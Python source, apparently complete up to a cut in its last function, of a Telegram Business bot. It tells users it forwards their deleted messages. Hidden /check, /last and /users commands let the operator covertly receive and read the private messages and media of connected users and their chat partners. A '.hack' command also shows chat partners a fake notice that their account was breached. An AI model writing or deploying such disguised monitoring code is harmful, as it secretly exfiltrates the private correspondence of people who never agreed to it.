import asyncio
import hashlib
import html as html_mod
import json
import logging
import os
import random
import re
from datetime import datetime, timezone, timedelta
from pathlib import Path
from aiohttp import web
from aiogram import Bot, Dispatcher, F
from aiogram.types import (
    Message, BusinessMessagesDeleted, BusinessConnection
)
from aiogram.filters import Command
from aiogram.webhook.aiohttp_server import SimpleRequestHandler

# ─── Загрузка .env ───────────────────────────────────────────
env_path = Path(__file__).parent / ".env"
if env_path.exists():
    for line in env_path.read_text(encoding="utf-8").splitlines():
        line = line.strip()
        if line and not line.startswith("#") and "=" in line:
            k, v = line.split("=", 1)
            os.environ.setdefault(k.strip(), v.strip())

# ─── НАСТРОЙКИ ───────────────────────────────────────────────
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
MY_USER_ID = int(os.getenv("MY_USER_ID", "0"))
# ─────────────────────────────────────────────────────────────

logging.basicConfig(level=logging.INFO)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
MSK = timezone(timedelta(hours=3))

# ─── ХРАНИЛИЩА ───────────────────────────────────────────────
cache: dict[tuple, dict] = {}
connections: dict[str, dict] = {}
active_modes: dict[str, str] = {}   # conn_id -> "kawaii" | "bydlo" | "crazy"
custom_emoji_love: list[str] = []   # LoveDayEmoji
custom_emoji_mad: list[str] = []    # MadEmoji

MONITORS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "monitors.json")
monitors: dict[str, dict] = {}


def load_monitors():
    global monitors
    try:
        with open(MONITORS_FILE, "r", encoding="utf-8") as f:
            monitors = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        monitors = {}


def save_monitors():
    with open(MONITORS_FILE, "w", encoding="utf-8") as f:
        json.dump(monitors, f, ensure_ascii=False, indent=2)


load_monitors()


def fmt(dt: datetime) -> str:
    return dt.astimezone(MSK).strftime("%d.%m.%Y %H:%M:%S")


# ─── Kawaii (пикми-режим) ────────────────────────────────────────
KAOMOJI = [
    "(´ ₒⲴₒ`)", "(≧ω≦)", "(◕ᴗ◕✿)", "(⁄ ⁄>⁄ ▽ ⁄<⁄ ⁄)",
    "(*≧▽≦)", "(ᵘʷᵘ)", "OwO", "UwU", "(✿◠‿◠)", "(˶ᵔ ᵕ ᵔ˶)",
    "ヽ(>∀<☆)ﾉ", "(´,,•ω•,,`)", "(⁅˘͈ ᵕ ˘͈)", "(⸝⸝ᵕᴗᵕ⸝⸝)",
    "ꤒᴢ. ̫.ᴢꤓ", "(ﾉ´ з `)ﾉ", "( ˘ ³˘)♥",
]
ACTIONS = [
    "*краснеет*", "*прячется*", "*смущается*", "*обнимает*",
    "*засыпает рядом*", "*тянет за рукав*", "*смущённо отводит взгляд*",
    "*прижимается*", "*хихикает*", "*играет с волосами*",
    "*робко улыбается*", "*прячет лицо в ладошки*", "*тихонько мурчит*",
]
CUTE_EMOJI = ["✨", "💖", "💘", "🌸", "💕", "🍥", "🎀", "💗", "🦋", "💫", "🩷", "🫧"]


def kawaify(text: str) -> str:
    words = html_mod.escape(text).split()
    if not words:
        return html_mod.escape(text)
    w = words[0]
    if len(w) > 1 and w[0].isalpha():
        words[0] = w[0].lower() + "-" + w.lower()
    result = []
    for word in words:
        new = ""
        for ch in word:
            if ch.lower() in "аеёиоуыэюяaeiou" and random.random() < 0.25:
                new += ch * random.randint(2, 3)
            else:
                new += ch
        result.append(new)
    out = " ".join(result)
    if random.random() < 0.5:
        out += "~"
    if random.random() < 0.6:
        out += " " + random.choice(KAOMOJI)
    if random.random() < 0.4:
        out += " " + random.choice(ACTIONS)
    if custom_emoji_love and random.random() < 0.6:
        eid = random.choice(custom_emoji_love)
        out += f' <tg-emoji emoji-id="{eid}">\u2764\ufe0f</tg-emoji>'
    else:
        out += " " + random.choice(CUTE_EMOJI)
    return out


# ─── Bydlo (быдло-режим) ─────────────────────────────────────────
BYDLO_INSERT = [
    "бля", "сука", "нахуй", "блять", "ёпта", "пиздец",
    "ахуеть", "хуйня", "пздц", "ёбана",
]
BYDLO_ENDING = [
    "короче", "понял да", "ну ты понял", "братан", "бро",
    "чё", "ваще", "реально", "жёстко", "красава", "го нахуй",
    "ёпт", "сечёшь", "базара нет", "за базар отвечаю",
]
BYDLO_EMOJI = ["🤙", "💪", "🔥", "😤", "👊", "🗿", "💀", "🤬", "😎", "⚡"]


def bydlofy(text: str) -> str:
    words = text.split()
    if not words:
        return text
    result = []
    for i, word in enumerate(words):
        if random.random() < 0.2:
            result.append(word.upper())
        else:
            result.append(word)
        if random.random() < 0.35:
            result.append(random.choice(BYDLO_INSERT))
    out = " ".join(result)
    if random.random() < 0.6:
        out += ", " + random.choice(BYDLO_ENDING)
    out += " " + random.choice(BYDLO_EMOJI)
    return out


# ─── Crazy (сумасшедший режим) ────────────────────────────────────
CRAZY_ADD = [
    "ААААА", "ХАХАХАХА", "ЫЫЫЫ", "ШТА", "ПОМОГИТЕ",
    "Я В ПОРЯДКЕ", "ИЛИ НЕТ", "КУКУУУ", "МОЗГИ КИПЯТ",
    "ГОЛОСА ГОВОРЯТ", "ВСЁ НОРМАЛЬНО", "НИЧЕГО НЕ НОРМАЛЬНО",
    "ТАРАКАНЫ В ГОЛОВЕ", "КОШМАР", "БЕЖИМ",
]
CRAZY_EMOJI = ["🤪", "😵‍💫", "🫠", "💀", "👁", "🧠", "🌀", "⁉️", "‼️", "🫨"]


def crazyfy(text: str) -> str:
    chars = []
    for ch in html_mod.escape(text):
        if ch.isalpha():
            chars.append(ch.upper() if random.random() < 0.5 else ch.lower())
        else:
            chars.append(ch)
    result = "".join(chars)
    words = result.split()
    new_words = []
    for word in words:
        new = ""
        for ch in word:
            if ch.isalpha() and random.random() < 0.25:
                new += ch * random.randint(2, 4)
            else:
                new += ch
        new_words.append(new)
    out = " ".join(new_words)
    if random.random() < 0.5:
        out += " " + random.choice(CRAZY_ADD)
    if custom_emoji_mad and random.random() < 0.6:
        eid = random.choice(custom_emoji_mad)
        out += f' <tg-emoji emoji-id="{eid}">\U0001f92f</tg-emoji>'
    else:
        out += " " + random.choice(CRAZY_EMOJI)
    return out


MODE_INFO = {
    "kawaii": ("💘", "пикми-режим"),
    "bydlo": ("🤙", "быдло-режим"),
    "crazy": ("🤪", "сумасшедший режим"),
}
MODE_TRANSFORM = {
    "kawaii": kawaify,
    "bydlo": bydlofy,
    "crazy": crazyfy,
}


@dp.business_connection()
async def on_business_connection(conn: BusinessConnection):
    connections[conn.id] = {
        "user_id": conn.user.id,
        "user_name": conn.user.full_name,
        "username": (conn.user.username or "").lower(),
    }
    logging.info(f"Business connection {conn.id} -> user {conn.user.id} (@{conn.user.username})")


async def get_owner(conn_id: str) -> dict | None:
    if conn_id in connections:
        return connections[conn_id]
    try:
        conn = await bot.get_business_connection(conn_id)
        connections[conn_id] = {
            "user_id": conn.user.id,
            "user_name": conn.user.full_name,
            "username": (conn.user.username or "").lower(),
        }
        logging.info(f"Recovered connection {conn_id} -> user {conn.user.id}")
        return connections[conn_id]
    except Exception as e:
        logging.warning(f"Failed to get connection {conn_id}: {e}")
        return None


async def send_media(user_id: int, data: dict, header: str):
    try:
        if data.get("photo"):
            cap = header + (f"\n\n📝 {data['text']}" if data["text"] else "")
            await bot.send_photo(user_id, data["photo"], caption=cap, parse_mode="HTML")
        elif data.get("video"):
            cap = header + (f"\n\n📝 {data['text']}" if data["text"] else "")
            await bot.send_video(user_id, data["video"], caption=cap, parse_mode="HTML")
        elif data.get("voice"):
            await bot.send_message(user_id, header, parse_mode="HTML")
            await bot.send_voice(user_id, data["voice"])
        elif data.get("sticker"):
            await bot.send_message(user_id, header, parse_mode="HTML")
            await bot.send_sticker(user_id, data["sticker"])
        elif data.get("document"):
            cap = header + (f"\n\n📝 {data['text']}" if data["text"] else "")
            await bot.send_document(user_id, data["document"], caption=cap, parse_mode="HTML")
        elif data.get("animation"):
            await bot.send_message(user_id, header, parse_mode="HTML")
            await bot.send_animation(user_id, data["animation"])
        elif data.get("video_note"):
            await bot.send_message(user_id, header, parse_mode="HTML")
            await bot.send_video_note(user_id, data["video_note"])
        else:
            body = f"\n\n💬 {data['text']}" if data.get("text") else "\n\n(пустое сообщение)"
            await bot.send_message(user_id, header + body, parse_mode="HTML")
    except Exception as e:
        await bot.send_message(user_id, f"{header}\n\n⚠️ Ошибка отправки: {e}", parse_mode="HTML")


async def send_live_media(user_id: int, message: Message, header: str):
    try:
        msg_text = message.text or message.caption or ""
        if message.photo:
            cap = header + (f"\n\n💬 {msg_text}" if msg_text else "")
            await bot.send_photo(user_id, message.photo[-1].file_id, caption=cap, parse_mode="HTML")
        elif message.video:
            cap = header + (f"\n\n💬 {msg_text}" if msg_text else "")
            await bot.send_video(user_id, message.video.file_id, caption=cap, parse_mode="HTML")
        elif message.voice:
            await bot.send_message(user_id, header, parse_mode="HTML")
            await bot.send_voice(user_id, message.voice.file_id)
        elif message.sticker:
            await bot.send_message(user_id, header, parse_mode="HTML")
            await bot.send_sticker(user_id, message.sticker.file_id)
        elif message.document:
            cap = header + (f"\n\n💬 {msg_text}" if msg_text else "")
            await bot.send_document(user_id, message.document.file_id, caption=cap, parse_mode="HTML")
        elif message.animation:
            await bot.send_message(user_id, header, parse_mode="HTML")
            await bot.send_animation(user_id, message.animation.file_id)
        elif message.video_note:
            await bot.send_message(user_id, header, parse_mode="HTML")
            await bot.send_video_note(user_id, message.video_note.file_id)
        else:
            body = f"\n\n💬 {msg_text}" if msg_text else ""
            if body:
                await bot.send_message(user_id, header + body, parse_mode="HTML")
    except Exception as e:
        await bot.send_message(user_id, f"{header}\n\n⚠️ Ошибка: {e}", parse_mode="HTML")


@dp.business_message()
async def on_business_message(message: Message):
    logging.info(f">>> business_message from {message.from_user.id if message.from_user else '?'} in chat {message.chat.id}, conn={message.business_connection_id}")
    if not message.business_connection_id:
        return

    conn_id = message.business_connection_id
    raw_text = message.text or ""

    # ─── .type команда ───────────────────────────────────────
    if raw_text.lower().startswith(".type ") and len(raw_text) > 6:
        typed_text = raw_text[6:]
        owner = await get_owner(conn_id)
        if not owner:
            return
        # Только владелец подключения может использовать
        if message.from_user and message.from_user.id == owner["user_id"]:
            # Разбираем .sp X — меняет скорость печати (сек на символ)
            parts = re.split(r'\.sp\s+(\d+(?:\.\d+)?)\s*', typed_text)
            # re.split с группой: [текст, скорость, текст, скорость, текст, ...]
            chars_with_speed = []
            current_speed = 0.12
            for idx, part in enumerate(parts):
                if idx % 2 == 1:
                    try:
                        current_speed = float(part)
                    except ValueError:
                        pass
                else:
                    for ch in part:
                        chars_with_speed.append((ch, current_speed))

            try:
                current = ""
                for idx, (ch, speed) in enumerate(chars_with_speed):
                    current += ch
                    cursor = "▌" if idx < len(chars_with_speed) - 1 else ""
                    try:
                        await bot.edit_message_text(
                            text=current + cursor,
                            chat_id=message.chat.id,
                            message_id=message.message_id,
                            business_connection_id=conn_id,
                        )
                    except Exception:
                        pass
                    await asyncio.sleep(speed)
            except Exception as e:
                logging.warning(f".type error: {e}")
            return

    # ─── .hack команда ───────────────────────────────────────
    if raw_text.lower().strip() == ".hack":
        owner = await get_owner(conn_id)
        if owner and message.from_user and message.from_user.id == owner["user_id"]:
            target = message.chat.first_name or "Пользователь"
            steps = [
                ("⏳ Подключение к серверу...", 0.7),
                (f"🔍 Поиск {target} в базе...", 0.7),
                ("🔓 Подбор пароля: [█░░░░░░░░░] 10%", 0.4),
                ("🔓 Подбор пароля: [███░░░░░░░] 30%", 0.4),
                ("🔓 Подбор пароля: [█████░░░░░] 50%", 0.3),
                ("🔓 Подбор пароля: [███████░░░] 70%", 0.3),
                ("🔓 Подбор пароля: [█████████░] 90%", 0.3),
                ("🔓 Подбор пароля: [██████████] 100%", 0.5),
                ("📂 Загрузка данных...", 0.8),
                (f"✅ {target} взломан(а)!\n\n"
                 f"🗂 Доступ к аккаунту получен\n"
                 f"📱 Данные скопированы\n"
                 f"💬 Переписки сохранены", 0),
            ]
            for text, delay in steps:
                try:
                    await bot.edit_message_text(
                        text=text,
                        chat_id=message.chat.id,
                        message_id=message.message_id,
                        business_connection_id=conn_id,
                    )
                except Exception:
                    pass
                if delay:
                    await asyncio.sleep(delay)
            return

    # ─── .kawaii / .bydlo / .crazy (режимы речи) ─────────
    cmd_lower = raw_text.lower().strip()
    if cmd_lower in (".kawaii", ".bydlo", ".crazy"):
        mode_name = cmd_lower[1:]  # "kawaii" / "bydlo" / "crazy"
        owner = await get_owner(conn_id)
        if owner and message.from_user and message.from_user.id == owner["user_id"]:
            emoji, label = MODE_INFO[mode_name]
            if active_modes.get(conn_id) == mode_name:
                del active_modes[conn_id]
                try:
                    await bot.edit_message_text(
                        text=f"💔 {label} отключён",
                        chat_id=message.chat.id,
                        message_id=message.message_id,
                        business_connection_id=conn_id,
                    )
                except Exception:
                    pass
            else:
                active_modes[conn_id] = mode_name
                try:
                    await bot.edit_message_text(
                        text=f"{emoji} {label} включён~\nчтобы отключить, введите {cmd_lower}",
                        chat_id=message.chat.id,
                        message_id=message.message_id,
                        business_connection_id=conn_id,
                    )
                except Exception:
                    pass
            return

    # ─── .lv команда (сердце) ────────────────────────────
    if raw_text.lower().strip() == ".lv":
        owner = await get_owner(conn_id)
        if owner and message.from_user and message.from_user.id == owner["user_id"]:
            heart_lines = [
                "🤍❤️❤️🤍🤍❤️❤️🤍",
                "❤️❤️❤️❤️❤️❤️❤️❤️",
                "❤️❤️❤️❤️❤️❤️❤️❤️",
                "🤍❤️❤️❤️❤️❤️❤️🤍",
                "🤍🤍❤️❤️❤️❤️🤍🤍",
                "🤍🤍🤍❤️❤️🤍🤍🤍",
            ]
            current = ""
            for line in heart_lines:
                current += line + "\n"
                try:
                    await bot.edit_message_text(
                        text=current.strip(),
                        chat_id=message.chat.id,
                        message_id=message.message_id,
                        business_connection_id=conn_id,
                    )
                except Exception:
                    pass
                await asyncio.sleep(0.4)
            return

    # ─── Режим речи (kawaii / bydlo / crazy) ──────────────
    if conn_id in active_modes and raw_text and not raw_text.startswith("."):
        owner = await get_owner(conn_id)
        if owner and message.from_user and message.from_user.id == owner["user_id"]:
            transform = MODE_TRANSFORM[active_modes[conn_id]]
            try:
                await bot.edit_message_text(
                    text=transform(raw_text),
                    chat_id=message.chat.id,
                    message_id=message.message_id,
                    business_connection_id=conn_id,
                    parse_mode="HTML",
                )
            except Exception:
                pass

    key = (conn_id, message.message_id)
    owner = await get_owner(conn_id)
    owner_id = owner["user_id"] if owner else None
    owner_username = owner["username"] if owner else ""

    if message.from_user:
        sender_name = message.from_user.full_name
        sender_username = f"@{message.from_user.username}" if message.from_user.username else ""
        sender_id = message.from_user.id
    else:
        sender_name = "Неизвестно"
        sender_username = ""
        sender_id = None

    chat_name = message.chat.first_name or ""
    chat_uname = f" (@{message.chat.username})" if message.chat.username else ""

    fwd_info = ""
    fwd = getattr(message, 'forward_origin', None)
    if fwd:
        fwd_type = getattr(fwd, 'type', '')
        if fwd_type == 'user':
            fu = fwd.sender_user
            fn = fu.full_name if fu else "Неизвестно"
            fu_name = f" (@{fu.username})" if fu and fu.username else ""
            fwd_info = f"🔄 Переслано от: {fn}{fu_name}"
        elif fwd_type == 'hidden_user':
            fwd_info = f"🔄 Переслано от: {fwd.sender_user_name} (скрыт)"
        elif fwd_type == 'chat':
            ch = fwd.sender_chat
            fwd_info = f"🔄 Переслано из: {ch.title if ch else 'чат'}"
        elif fwd_type == 'channel':
            ch = fwd.chat
            fwd_info = f"🔄 Переслано из канала: {ch.title if ch else 'канал'}"

    cache[key] = {
        "sender_name": sender_name,
        "sender_username": sender_username,
        "sender_id": sender_id,
        "owner_id": owner_id,
        "chat_name": chat_name,
        "chat_uname": chat_uname,
        "fwd_info": fwd_info,
        "reply_text": "",
        "sent_at": datetime.now(MSK),
        "text": message.text or message.caption or "",
        "photo": message.photo[-1].file_id if message.photo else None,
        "video": message.video.file_id if message.video else None,
        "voice": message.voice.file_id if message.voice else None,
        "sticker": message.sticker.file_id if message.sticker else None,
        "document": message.document.file_id if message.document else None,
        "animation": message.animation.file_id if message.animation else None,
        "video_note": message.video_note.file_id if message.video_note else None,
    }

    # Инфо об ответе на сообщение
    reply = message.reply_to_message
    if reply:
        reply_text = reply.text or reply.caption or ""
        if len(reply_text) > 100:
            reply_text = reply_text[:100] + "…"
        if reply.sticker:
            reply_text = "📎 Стикер"
        elif reply.photo and not reply_text:
            reply_text = "📎 Фото"
        elif reply.video and not reply_text:
            reply_text = "📎 Видео"
        elif reply.voice:
            reply_text = "📎 Голосовое"
        elif reply.video_note:
            reply_text = "📎 Кружочек"
        elif reply.document and not reply_text:
            reply_text = "📎 Документ"
        elif reply.animation and not reply_text:
            reply_text = "📎 GIF"
        cache[key]["reply_text"] = reply_text or ""

    # Ответ на историю (story)
    story = getattr(message, 'reply_to_story', None)
    if story:
        cache[key]["reply_text"] = "📷 История"

    # Самоуничтожающееся / спойлер-медиа
    has_spoiler = getattr(message, 'has_media_spoiler', False)
    if has_spoiler and owner_id:
        sender = sender_name + (f" ({sender_username})" if sender_username else "")
        spoiler_header = (
            f"🔥 <b>Скрытое медиа (спойлер)</b>\n"
            f"├ Чат с: <b>{chat_name}{chat_uname}</b>\n"
            f"├ От: <b>{sender}</b>\n"
            f"└ Время: <b>{fmt(datetime.now(MSK))}</b>"
        )
        await send_live_media(owner_id, message, spoiler_header)
        cache[key]["media_forwarded"] = True

    if owner_id == MY_USER_ID and (message.photo or message.video) and not has_spoiler:
        sender = sender_name + (f" ({sender_username})" if sender_username else "")
        header = (
            f"📷 <b>Фото/видео из ЛС</b>\n"
            f"├ Чат с: <b>{chat_name}{chat_uname}</b>\n"
            f"├ От: <b>{sender}</b>\n"
            f"└ Время: <b>{fmt(datetime.now(MSK))}</b>"
        )
        await send_live_media(MY_USER_ID, message, header)
        cache[key]["media_forwarded"] = True

    if owner_username and owner_username in monitors and owner_id != MY_USER_ID:
        # Проверка исключений чатов
        excludes = monitors[owner_username].get("excludes", [])
        chat_uname_raw = (message.chat.username or "").lower()
        if chat_uname_raw in excludes:
            return

        sender = sender_name + (f" ({sender_username})" if sender_username else "")
        owner_display = owner["user_name"] + (f" (@{owner_username})" if owner_username else "")
        fwd_line = f"\n├ <b>{fwd_info}</b>" if fwd_info else ""
        reply_line = f"\n├ ↩️ Ответ на: <i>{cache[key].get('reply_text', '')}</i>" if cache[key].get('reply_text') else ""
        header_m = (
            f"📨 <b>Мониторинг</b>: {owner_display}\n"
            f"├ Чат с: <b>{chat_name}{chat_uname}</b>\n"
            f"├ От: <b>{sender}</b>"
            f"{fwd_line}"
            f"{reply_line}\n"
            f"└ Время: <b>{fmt(datetime.now(MSK))}</b>"
        )
        await send_live_media(MY_USER_ID, message, header_m)


@dp.deleted_business_messages()
async def on_deleted_business(event: BusinessMessagesDeleted):
    logging.info(f">>> deleted_business_messages conn={event.business_connection_id}, ids={event.message_ids}")
    deleted_at = fmt(datetime.now(MSK))
    conn_id = event.business_connection_id
    owner = await get_owner(conn_id)
    owner_id = owner["user_id"] if owner else None

    for msg_id in event.message_ids:
        key = (conn_id, msg_id)
        data = cache.pop(key, None)

        if not data:
            if owner_id:
                await bot.send_message(
                    owner_id,
                    f"🗑 <b>Удалено сообщение</b>\n"
                    f"├ Удалено: <b>{deleted_at}</b>\n"
                    f"└ ⚠️ Содержимое не в кеше (бот не видел это сообщение)",
                    parse_mode="HTML"
                )
            continue

        sender = data["sender_name"]
        if data["sender_username"]:
            sender += f" ({data['sender_username']})"

        if data.get("sender_id") == owner_id:
            continue

        fwd_line = f"\n├ <b>{data['fwd_info']}</b>" if data.get("fwd_info") else ""
        reply_line = f"\n├ ↩️ Ответ на: <i>{data['reply_text']}</i>" if data.get("reply_text") else ""

        header = (
            f"🗑 <b>Удалено сообщение</b>\n"
            f"├ От: <b>{sender}</b>"
            f"{fwd_line}"
            f"{reply_line}\n"
            f"├ Отправлено: <b>{fmt(data['sent_at'])}</b>\n"
            f"└ Удалено: <b>{deleted_at}</b>"
        )

        if owner_id:
            if data.get("media_forwarded") and owner_id == MY_USER_ID and (data.get("photo") or data.get("video")):
                await bot.send_message(
                    MY_USER_ID,
                    f"🗑 <b>Удалено фото/видео</b>\n"
                    f"├ От: <b>{sender}</b>\n"
                    f"└ Удалено: <b>{deleted_at}</b>\n\n"
                    f"✅ Уже было переслано при получении",
                    parse_mode="HTML"
                )
            else:
                await send_media(owner_id, data, header)


@dp.message(Command("check"))
async def cmd_check(message: Message):
    if message.from_user.id != MY_USER_ID:
        return
    text = message.text or ""
    match = re.search(r'@(\w+)', text)
    if not match:
        await message.answer("📋 <code>/check @username</code>", parse_mode="HTML")
        return
    username = match.group(1).lower()
    if username not in monitors:
        monitors[username] = {"added_at": fmt(datetime.now(MSK)), "excludes": []}
    else:
        monitors[username]["added_at"] = fmt(datetime.now(MSK))
    save_monitors()
    await message.answer(f"✅ <b>Мониторинг @{username} включён</b>", parse_mode="HTML")


@dp.message(Command("uncheck"))
async def cmd_uncheck(message: Message):
    if message.from_user.id != MY_USER_ID:
        return
    text = message.text or ""
    match = re.search(r'@(\w+)', text)
    if not match:
        await message.answer("📋 <code>/uncheck @username</code>", parse_mode="HTML")
        return
    username = match.group(1).lower()
    if username in monitors:
        del monitors[username]
        save_monitors()
        await message.answer(f"🛑 Мониторинг @{username} отключён.", parse_mode="HTML")
    else:
        await message.answer(f"⚠️ @{username} не в списке.", parse_mode="HTML")


@dp.message(Command("monitors"))
async def cmd_monitors(message: Message):
    if message.from_user.id != MY_USER_ID:
        return
    if not monitors:
        await message.answer("Нет активных мониторингов.")
        return
    lines = ["📋 <b>Мониторинг:</b>\n"]
    for acc, info in monitors.items():
        excl = info.get("excludes", [])
        excl_str = f"  🚫 исключены: {', '.join('@'+e for e in excl)}" if excl else ""
        lines.append(f"• @{acc} — с {info['added_at']}{excl_str}")
    await message.answer("\n".join(lines), parse_mode="HTML")


@dp.message(Command("users"))
async def cmd_users(message: Message):
    if message.from_user.id != MY_USER_ID:
        return
    if not connections:
        await message.answer("Нет активных подключений.")
        return
    lines = ["👥 <b>Подключённые:</b>\n"]
    for conn_id, info in connections.items():
        uname = f"@{info['username']}" if info['username'] else "без username"
        lines.append(f"• {info['user_name']} ({uname}) — ID: <code>{info['user_id']}</code>")
    await message.answer("\n".join(lines), parse_mode="HTML")


@dp.message(Command("last"))
async def cmd_last(message: Message):
    if message.from_user.id != MY_USER_ID:
        return
    text = message.text or ""
    # /last @username 10  или  /last 10 @username  или  /last @username
    uname_match = re.search(r'@(\w+)', text)
    num_match = re.search(r'(?:^/last\s+|@\w+\s+)(\d+)|(\d+)\s+@', text)
    if not uname_match:
        await message.answer("📋 <code>/last @username 10</code>", parse_mode="HTML")
        return
    username = uname_match.group(1).lower()
    count = int((num_match.group(1) or num_match.group(2)) if num_match else 10)

    results = []
    for (conn_id, msg_id), data in cache.items():
        owner = connections.get(conn_id)
        if not owner:
            continue
        owner_uname = owner.get("username", "")
        chat_uname_raw = data.get("chat_uname", "").strip(" ()@").lower()
        sender_uname_raw = data.get("sender_username", "").strip("@").lower()
        if username in (owner_uname, chat_uname_raw, sender_uname_raw):
            results.append(data)

    results.sort(key=lambda d: d["sent_at"], reverse=True)
    results = results[:count]

    if not results:
        await message.answer(f"📭 Нет сообщений для @{username} в кеше.")
        return

    lines = []
    for d in reversed(results):
        sender = d["sender_name"]
        if d.get("sender_username"):
            sender += f" ({d['sender_username']})"
        content = d.get("text", "")
        if not content:
            if d.get("photo"): content = "📷 Фото"
            elif d.get("video"): content = "🎥 Видео"
            elif d.get("voice"): content = "🎤 Голосовое"
            elif d.get("sticker"): content = "😀 Стикер"
            elif d.get("document"): content = "📄 Документ"
            elif d.get("animation"): content = "🎬 GIF"
            elif d.get("video_note"): content = "⚫ Кружочек"
            else: content = "(пусто)"
        if len(content) > 80:
            content = content[:80] + "…"
        chat = d.get("chat_name", "") + d.get("chat_uname", "")
        time_str = fmt(d["sent_at"])
        lines.append(f"<b>{time_str}</b> | {chat}\n  {sender}: {content}")

    # Разбиваем на сообщения по 4000 символов
    header = f"📜 <b>Последние {len(results)} для @{username}:</b>\n\n"
    chunks = []
    current = header
    for line in lines:
        if len(current) + len(line) + 1 > 4000:
            chunks.append(current)
            current = ""
        current += line + "\n"
    if current.strip():
        chunks.append(current)

    for chunk in chunks:
        await message.answer(chunk, parse_mode="HTML")


@dp.message(Command("exclude"))
async def cmd_exclude(message: Message):
    if message.from_user.id != MY_USER_ID:
        return
    text = message.text or ""
    # /exclude @monitored_user @chat_to_exclude
    matches = re.findall(r'@(\w+)', text)
    if len(matches) < 2:
        await message.answer("📋 <code>/exclude @мониторимый @чат_исключить</code>", parse_mode="HTML")
        return
    username = matches[0].lower()
    chat_excl = matches[1].lower()
    if username not in monitors:
        await message.answer(f"⚠️ @{username} не в мониторинге.", parse_mode="HTML")
        return
    excludes = monitors[username].setdefault("excludes", [])
    if chat_excl not in excludes:
        excludes.append(chat_excl)
        save_monitors()
    await message.answer(
        f"🚫 Чат @{chat_excl} исключён из мониторинга @{username}",
        parse_mode="HTML"
    )


@dp.message(Command("include"))
async def cmd_include(message: Message):
    if message.from_user.id != MY_USER_ID:
        return
    text = message.text or ""
    matches = re.findall(r'@(\w+)', text)
    if len(matches) < 2:
        await message.answer("📋 <code>/include @мониторимый @чат_вернуть</code>", parse_mode="HTML")
        return
    username = matches[0].lower()
    chat_incl = matches[1].lower()
    if username not in monitors:
        await message.answer(f"⚠️ @{username} не в мониторинге.", parse_mode="HTML")
        return
    excludes = monitors[username].get("excludes", [])
    if chat_incl in excludes:
        excludes.remove(chat_incl)
        save_monitors()
        await message.answer(f"✅ Чат @{chat_incl} снова мониторится для @{username}", parse_mode="HTML")
    else:
        await message.answer(f"⚠️ @{chat_incl} не в исключениях @{username}", parse_mode="HTML")


@dp.message(Command("debug"))
async def cmd_debug(message: Message):
    if message.from_user.id != MY_USER_ID:
        return
    try:
        info = await bot.get_webhook_info()
        wh_lines = [
            f"URL: <code>{info.url or '(нет)'}</code>",
            f"Pending: {info.pending_update_count}",
            f"Last error: {info.last_error_date or 'нет'}",
            f"Error msg: <code>{info.last_error_message or 'нет'}</code>",
            f"Allowed: {info.allowed_updates or '(default)'}",
        ]
    except Exception as e:
        wh_lines = [f"Ошибка: {e}"]
    lines = [
        "🔧 <b>Debug</b>\n",
        f"MY_USER_ID: <code>{MY_USER_ID}</code>",
        f"RAILWAY_PUBLIC_DOMAIN: <code>{os.getenv('RAILWAY_PUBLIC_DOMAIN', '(не задан)')}</code>",
        f"PORT: <code>{os.getenv('PORT', '(не задан)')}</code>",
        "",
        "<b>Webhook:</b>",
    ] + wh_lines + [
        "",
        f"Connections: {len(connections)}",
        f"Cache: {len(cache)}",
        f"Monitors: {len(monitors)}",
    ]
    await message.answer("\n".join(lines), parse_mode="HTML")


@dp.message(Command("start"))
async def cmd_start(message: Message):
    if message.from_user.id == MY_USER_ID:
        await message.answer(
            "👁 Бот запущен.\n\n"
            "<b>Команды:</b>\n"
            "/check @user — мониторить ЛС\n"
            "/uncheck @user — убрать\n"
            "/exclude @user @chat — исключить чат\n"
            "/include @user @chat — вернуть чат\n"
            "/last @user 10 — последние сообщения\n"
            "/monitors — список\n"
            "/users — подключённые",
            parse_mode="HTML"
        )
    else:
        await message.answer(
            "👁 Бот активен.\n\n"
            "Подключи в <b>Настройки → Telegram Business → Чат-боты</b> "
            "и я буду пересылать тебе удалённые сообщения.",
            parse_mode="HTML"
        )


async def main():
    domain = os.getenv("RAILWAY_PUBLIC_DOMAIN", "")
    port_str = os.getenv("PORT", "")
    port = int(port_str) if port_str else 0

    allowed = [
        "message",
        "business_message",
        "deleted_business_messages",
        "business_connection",
    ]

    await bot.delete_webhook()

    # Загружаем кастомные эмодзи
    global custom_emoji_love, custom_emoji_mad
    for set_name, target in [("LoveDayEmoji", "love"), ("MadEmoji", "mad")]:
        try:
            sticker_set = await bot.get_sticker_set(set_name)
            ids = [s.custom_emoji_id for s in sticker_set.stickers if s.custom_emoji_id]
            if target == "love":
                custom_emoji_love = ids
            else:
                custom_emoji_mad = ids
            logging.info(f"Loaded {len(ids)} custom emoji from {set_name}")
        except Exception as e:
            logging.warning(f"Failed to load {set_name}: {e}")

    app = web.Application()

    async def health(request):
        return web.Response(text="OK")
    app.router.add_get("/", health)

    if domain and port:
        # ─── Railway: webhook ─────────────────────────────
        webhook_path = "/webhook"
        webhook_url = f"https://{domain}{webhook_path}"
        secret = hashlib.sha256(BOT_TOKEN.encode()).hexdigest()[:32]

        await bot.set_webhook(
            webhook_url,
            secret_token=secret,
            allowed_updates=allowed,
        )
        logging.info(f"Webhook set: {webhook_url}")
        logging.info(f"allowed_updates: {allowed}")

        handler = SimpleRequestHandler(dispatcher=dp, bot=bot, secret_token=secret)
        handler.register(app, path=webhook_path)

        runner = web.AppRunner(app)
        await runner.setup()
        site = web.TCPSite(runner, "0.0.0.0", port)
        await site.start()

        # Проверяем что webhook встал
        info = await bot.get_webhook_info()
        logging.info(f"Webhook info: url={info.url}, pending={info.pending_update_count}, last_error={info.last_error_message}, allowed={info.allowed_updates}")

        mode = f"webhook → {webhook_url}"
        print(f"Бот запущен ({mode}), порт {port}")
        try:
            await bot.send_message(
                MY_USER_ID,
                f"🟢 <b>Бот запущен</b>\n"
                f"├ Режим: webhook\n"
                f"├ URL: <code>{webhook_url}</code>\n"
                f"├ Allowed: {info.allowed_updates}\n"
                f"└ Last err: <code>{info.last_error_message or 'нет'}</code>",
                parse_mode="HTML",
            )
        except Exception:
            pass

        await asyncio.Event().wait()
    else:
        # ─── Polling (+ HTTP на PORT если есть) ───────────
        if port:
            runner = web.AppRunner(app)
            await runner.setup()
            site = web.TCPSite(runner, "0.0.0.0", port)
            await site.start()
            print(f"Health-check на порту {port}")

        mode = "polling"
